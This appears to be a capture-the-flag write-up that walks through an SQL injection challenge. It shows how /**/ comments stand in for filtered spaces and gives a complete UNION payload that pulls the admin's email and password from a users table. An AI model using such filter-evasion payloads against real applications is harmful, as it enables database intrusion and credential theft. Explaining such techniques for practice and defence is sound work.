So we can't do -- comments and no spaces.
Hm.

How about comments?

This SQL Injection like many others come in three parts.
First to escape from the parameter you're in. In this case no problem. just use "3)".
The second part is to do whatever we would like to do. In this case UNION some more statements together since we can only do one statement.
Finally we can comment with \/* since that would 


We have a comment below which is a hint? It also has a \*/ for us

```sql
SELECT username FROM users WHERE ( role = 'USER' AND email LIKE '%@yahoo.com' ) AND ( id > 13.37 AND id <= 3)/* ) LIMIT 0 -- 10
/**
* Set "LIMIT" to 10 when in production
*/
```

Are comments valid token delimiters? Yes they are!

So something like 
```sql
3)/**/UNION/**/SELECT/**/email/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin';/*
```
should work and indeed it does.
Complete payload is:

```sql
3)/**/UNION/**/SELECT/**/email/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin';/*
```

Giving us:
```sql
SELECT username FROM users WHERE ( role = 'USER' AND email LIKE '%@yahoo.com' ) AND ( id > 13.37 AND id <= 3)/**/UNION/**/SELECT/**/email/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin';/* ) LIMIT 0 -- 10
/**
* Set "LIMIT" to 10 when in production
*/
```

```json
[
  {
    "username": "FLAG{XXXXXXXXXXXXXXXXXXXXXXXXXX}"
  },
  {
    "username": "murphygary@gmail.com"
  }
]
```
